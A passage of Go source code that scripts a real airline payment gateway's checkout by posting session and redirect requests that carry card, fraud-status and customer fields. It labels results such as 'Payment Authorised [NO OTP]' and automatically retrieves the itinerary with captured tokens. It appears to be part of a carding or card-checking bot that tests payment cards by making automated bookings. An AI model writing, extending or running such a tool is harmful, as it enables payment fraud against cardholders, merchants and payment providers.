		if fraudDesc == "Rejected" {
			// Fraud rejected - payment not successful
			return false, "Response: Fraud Status Rejected", nil, nil
		}

		// sessioncomplete
		scDict := map[string]interface{}{
			"transactionId":    transactionID,
			"clientId":         v["clientid"],
			"pollingTimeout":   "30",
			"minPollingInterval": "1",
			"maxPollingInterval": "10",
			"sessionId":        fmt.Sprint(pcJSON["session_id"]),
			"mode":             "1",
			"secure":           "false",
			"statusCode":       fmt.Sprint(pcJSON["status_code"]),
			"token":            v["timetoken"],
			"sessiontime":      "13",
		}
		for k, val := range securedData {
			scDict[k] = val
		}
		scBytes, _ := json.Marshal(scDict)
		doJSONPost(stdClient, "https://pop.cellpointdigital.net/api/sessioncomplete",
			ua,
			map[string]string{"referer": location, "origin": "https://pop.cellpointdigital.net"},
			string(scBytes),
		)

		// Build additional_data params string
		var addDataParts []string
		if addData, ok := pcJSON["additional_data"].([]interface{}); ok {
			for _, item := range addData {
				if m, ok := item.(map[string]interface{}); ok {
					addDataParts = append(addDataParts,
						fmt.Sprintf("%s=%s", m["name"], m["value"]),
					)
				}
			}
		}

		// Final redirect
		finalURL := fmt.Sprint(pcJSON["url"])
		expParts := strings.Split(fmt.Sprint(pcJSON["expiration_date"]), "/")
		mm := monthFmt
		yyShort := yearShort
		if len(expParts) == 2 {
			mm = expParts[0]
			yyShort = expParts[1]
		}
		redirectBody := fmt.Sprintf(
			"transaction_id=%s&transaction_status=1&order_id=%s&amount=%s&state_id=2001&sign=%s&session_id=%s&currency=608&decimals=2&payment_method=Card&card_name=%s&masked_card=%s&approval_code=%s&psp_name=CyberSource&fraud_status_code=%s&fraud_status_desc=%s&%s&expiration_date=%s%%2F%s&first_name=%s&last_name=%s&street_address=%s&city=%s&country=Philippines&country_alpha2code=PH&province=%s&postal_code=%s&email=%s&mobile_number=%s&dialing_country_code=63&psp_ref_id=%s&date_time=%s&ip_address=%s",
			url.QueryEscape(fmt.Sprint(pcJSON["transaction_id"])),
			url.QueryEscape(fmt.Sprint(pcJSON["order_id"])),
			url.QueryEscape(fmt.Sprint(pcJSON["amount"])),
			url.QueryEscape(fmt.Sprint(pcJSON["sign"])),
			url.QueryEscape(fmt.Sprint(pcJSON["session_id"])),
			url.QueryEscape(fmt.Sprint(pcJSON["card_name"])),
			url.QueryEscape(fmt.Sprint(pcJSON["masked_card"])),
			url.QueryEscape(fmt.Sprint(pcJSON["approval_code"])),
			url.QueryEscape(fmt.Sprint(pcJSON["fraud_status_code"])),
			url.QueryEscape(fmt.Sprint(pcJSON["fraud_status_desc"])),
			strings.Join(addDataParts, "&"),
			url.QueryEscape(mm), url.QueryEscape(yyShort),
			url.QueryEscape(fmt.Sprint(pcJSON["first_name"])),
			url.QueryEscape(fmt.Sprint(pcJSON["last_name"])),
			url.QueryEscape(fmt.Sprint(pcJSON["street_address"])),
			url.QueryEscape(fmt.Sprint(pcJSON["city"])),
			url.QueryEscape(fmt.Sprint(pcJSON["province"])),
			url.QueryEscape(fmt.Sprint(pcJSON["postal_code"])),
			url.QueryEscape(fmt.Sprint(pcJSON["email"])),
			url.QueryEscape(fmt.Sprint(pcJSON["mobile"])),
			url.QueryEscape(fmt.Sprint(pcJSON["psp_ref_id"])),
			url.QueryEscape(fmt.Sprint(pcJSON["date_time"])),
			url.QueryEscape(fmt.Sprint(pcJSON["ip_address"])),
		)
		doFormPost(stdClient, finalURL,
			ua,
			map[string]string{"origin": "https://pop.cellpointdigital.net"},
			redirectBody,
		)

		amountRaw := fmt.Sprint(pcJSON["amount"])
		amountDisplay := 0.0
		if n, e := strconv.ParseFloat(amountRaw, 64); e == nil {
			amountDisplay = n / 100
		}
		fraudDescFinal := fmt.Sprint(pcJSON["fraud_status_desc"])
		emailVal := fmt.Sprint(pcJSON["email"])
		if emailVal == "<nil>" {
			emailVal = v["email"]
		}

		// Attempt automatic itinerary retrieval after payment authorization
		var itin *ItineraryData
		if xAuthToken != "" && bearerToken != "" {
			itin, _ = fetchItinerary(xAuthToken, bearerToken, ua)
			if itin == nil {
				logError("[*] Itinerary retrieval failed — continuing execution")
				itin = &ItineraryData{RecordLocator: "N/A"}
			}
		}

		msg := fmt.Sprintf("Response: Payment Authorised\nFraud Status: %s\nAmount: %.2f\nEmail: %s\nAuth Time: %s",
			fraudDescFinal, amountDisplay, emailVal, time.Now().UTC().Format(time.RFC3339))
		return true, msg, itin, nil

	case "2000":
		amountRaw := v["amount"]
		amountDisplay := 0.0
		if n, e := strconv.ParseFloat(amountRaw, 64); e == nil {
			amountDisplay = n / 100
		}
		// Attempt itinerary retrieval for NO OTP path too
		var itinNO *ItineraryData
		if xAuthToken != "" && bearerToken != "" {
			itinNO, _ = fetchItinerary(xAuthToken, bearerToken, ua)
			if itinNO == nil {
				logError("[*] Itinerary retrieval failed — continuing execution")
				itinNO = &ItineraryData{RecordLocator: "N/A"}
			}
		}
		msgNO := fmt.Sprintf("Response: Payment Authorised [NO OTP]\nAmount: %.2f\nEmail: %s\nAuth Time: %s",
			amountDisplay, v["email"], time.Now().UTC().Format(time.RFC3339))
		return true, msgNO, itinNO, nil

	case "400":
		msg := fmt.Sprint(authJSON["message"])
		return false, fmt.Sprintf("Response: 400 [%s]", msg), nil, nil

	default:
		sub := ""
		if sc := fmt.Sprint(authJSON["subcode"]); sc != "" && sc != "<nil>" {
			sub = " - " + subcodeMessage(sc)
		}
		msg := fmt.Sprint(authJSON["message"])
		return false, fmt.Sprintf("Response: %s%s [%s]", authorizeCode, sub, msg), nil, nil
	}
}
